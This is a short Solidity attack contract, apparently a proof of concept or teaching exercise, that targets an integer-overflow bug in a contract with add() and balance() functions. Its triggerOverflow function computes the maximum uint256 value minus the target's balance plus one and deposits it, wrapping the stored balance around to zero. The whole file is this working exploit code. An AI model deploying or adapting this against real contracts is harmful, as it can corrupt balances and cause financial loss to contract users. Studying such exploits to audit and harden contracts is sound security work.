interface IOverflow_Add {
    function add(uint256 deposit) external;
    function balance() external view returns (uint256);
}

contract Overflow_Attack {
    IOverflow_Add public target;

    constructor(address _targetAddress) {
        target = IOverflow_Add(_targetAddress);
    }

    function triggerOverflow() public {
        uint256 maxUint = type(uint256).max;
        uint256 overflowValue = maxUint - target.balance() + 1;
        target.add(overflowValue);
    }

    function getTargetBalance() public view returns (uint256) {
        return target.balance();
    }
}